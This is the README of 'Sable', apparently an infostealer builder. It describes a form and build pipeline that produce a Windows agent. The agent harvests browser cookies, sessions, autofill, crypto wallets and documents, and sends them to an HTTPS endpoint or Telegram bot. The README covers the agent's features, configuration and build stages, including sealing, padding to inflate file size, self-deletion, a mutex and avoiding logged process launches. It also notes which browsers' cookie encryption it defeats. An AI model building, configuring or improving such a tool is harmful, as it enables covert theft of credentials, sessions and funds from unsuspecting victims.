# Sable

A Windows collection agent, the desktop form that configures it, and the build
pipeline that welds the two together into one file. Everything is Python; the form is
PySide6, the seal is AES-256-GCM, and the artifact is either a frozen executable with
the archive behind it or a single runnable script.

The repository is the whole tool: no generated code is checked in, and every file in
`MANIFEST.txt` is load-bearing enough to be listed there.

## Requirements

- Windows 10 or 11 for collection. The forge, the seal and the tests run anywhere
  CPython does.
- CPython 3.11 or newer.
- `pycryptodome` for the seal, `PySide6-Essentials` for the form.

## Install and run

```
pip install -e .
sable
```

`python -m app.main` starts the same process. There is no `app/__main__.py` on
purpose: a module executed as `__main__` and the same module imported by the console
script are two objects in `sys.modules`, and the second one re-runs the module body.

## The form

Five routes down the left rail.

| Route | Holds |
| --- | --- |
| Relay | Kind (`https` or `telegram`) and the endpoint |
| Sources | One toggle per field in `SourceConfig` |
| Tuning | Mutex name, seal key, self-remove, ballast, output directory |
| Forge | Output format, optional artifact name, frozen launcher, name preview |
| Run | The gated Run button, per-stage progress, the terminal state |

The Run button is held down until every blocking rule passes, and the reason is
written next to it. Every edit anywhere in the form rebuilds the config and re-runs
the rules, so the gate cannot fall out of step with the fields — the same path is
taken whether a value was typed by hand or set by the program.

## What a build produces

The pipeline runs six stages and emits progress between them:

```
validate -> payload -> seal -> forge -> rename -> done
```

`payload` assembles a zip of `agent/` verbatim, `core/schema.py` as
`sable_schema.py`, and `cfg.json`. `seal` encrypts that zip under a key stretched
from the seal key with PBKDF2-HMAC-SHA256. `forge` writes the container. `rename`
gives it its shipping name, or the first free `_2` variant when that name is taken.

The executable container, last byte backwards:

```
[ frozen launcher ][ ballast ][ sealed archive ][ footer: "SBLT" + u64 offset ]
```

The footer is last so `agent/loader.py` finds the archive with one seek from EOF. The
offset is measured from the start of the file, which is why ballast sits before the
sealed archive rather than after the footer.

The script container is one `.py` file carrying the same sealed bytes as base64, plus
the key, for a machine with an interpreter and no frozen launcher. `py` output ignores
ballast: padding a text file with comment lines changes nothing a reader cares about,
and the tuning page says so rather than pretending the number did something.

Executable output needs a frozen launcher — a PyInstaller onefile build of
`agent/loader.py`. It is not produced by this repository and is not a manifest slot.

## Configuration

`config.example.json` is a valid document under `schema_version: 1`. The form writes
the same shape; the built artifact carries a copy inside its archive, and
`agent/config.py` reads that copy and nothing on disk.

```json
{
  "schema_version": 1,
  "mutex": "Global\\SableRun",
  "seal_key": "k-3f9a-replace-this-with-32-hex-characters",
  "relay": { "kind": "https", "endpoint": "https://relay.example/ingest" },
  "sources": {
    "autofill": true, "documents": true, "wallets": true,
    "sessions": true, "system": true, "browsers": true
  },
  "self_remove": false,
  "ballast_mb": 0
}
```

`from_dict` is the only reader. It rejects unknown keys, types that are merely
compatible (`1` is not `true`, `"1"` is not `1`) and any version but the current one,
and every rejection names the dotted path of the field — `relay.endpoint`,
`sources.telepathy`, `ballast_mb` — so a caller can paint the field that caused it.

The relay endpoint is keyed on the kind rather than matched against one permissive
pattern. `https` needs a parseable `http`/`https` URL with a host; `telegram` needs
`token$chat` with exactly one `$` and a token shaped `<digits>:<secret>`. A bot token
in the https field is a mistake that would otherwise surface at transmit time.

## Validation

`core/validate.py` returns problems, never exceptions, and never stops at the first
one. Six rules:

| Rule | Path | Blocks |
| --- | --- | --- |
| `mutex` | `mutex` | empty, over 200 characters, or an illegal character |
| `seal_key` | `seal_key` | empty, padded with whitespace, or under 12 characters |
| `relay.endpoint` | `relay.endpoint` and `relay.kind` | anything that cannot reach the relay |
| `sources` | `sources` | every source switched off |
| `ballast_mb` | `ballast_mb` | outside `0..4096`; a note, not a stop, on `py` output |
| `output` | `output.mode`, `output.name`, `output.stub` | an unknown format, a name with the wrong extension, an executable build with no launcher |

A problem that is true but harmless carries `blocking=False`, so the form can say
"8 MB is ignored for script output" without holding the Run button down.

## Layout

```
agent/        the payload: config, gate, relay, sources, loader, Win32 layer
core/         schema, seal, rename, forge, validate, pipeline
app/          the form: entry, shell, rail, worker, five pages, two widgets
app/theme/    dark.qss and light.qss, defining the same object names
tests/        manifest parity, import direction, config paths, inter-module contracts
```

Import direction is enforced by `tests/test_imports.py`, parsed with `ast`:

- `app/` may import `core/`, read-only.
- `core/` never imports `agent/` or `app/`.
- `agent/` never imports `core/` or `app/`.

`core/forge.py` contains `from agent import entry, loader` as text inside its script
template. A grep finds it; an AST walk over the module's own imports does not. That is
why the test parses.

## Tests

```
pip install -e ".[dev]"
pytest
```

`pytest` needs no display and no Qt binding: `app` and `app.main` import with the
binding absent, which is a stated acceptance line rather than an accident. The
contract tests seal with `core/seal.py` and open with `agent/loader.py`, then build a
real container and read it back through the loader's own footer parser, so the two
halves of the format cannot drift apart quietly.

## Windows notes

The Win32 layer is `ctypes.WinDLL(..., use_last_error=True)` with explicit `argtypes`
and `restype` on every function. No pywin32, no `wmic`, no `tasklist`, no `getmac`, no
`reg` — each of those is a process launch, a parsing problem and a log line.

## Known limits

- Google Chrome's app-bound v20 cookies cannot be read. The decryption lives in
  `chrome/elevation_service/internal/`, which is not in the public tree. Chromium,
  Edge, Brave, Vivaldi and Opera are unaffected.
- Executable output needs the frozen launcher described above.
- Ballast is applied to executable output only.
- `DECISIONS.md` records every judgement call made while building this, including the
  manifest deltas and the four gate-table rows folded into larger files.

## Vocabulary

The same words are used in code, in the form and in this file.

| Word | Means |
| --- | --- |
| Source | one collection module under `agent/sources/` |
| Agent | the payload that runs on the collected machine |
| Relay | the endpoint the finished artifact is transmitted to |
| Transmit | the send step in `agent/relay.py` |
| Self-remove | delete the artifact after a successful transmit |
| Ballast | random padding in front of the sealed archive |
| Forge | assemble payload, seal, container and name |
| Seal | encrypt the archive under the seal key |
| Fused | the launcher and the archive as one file |
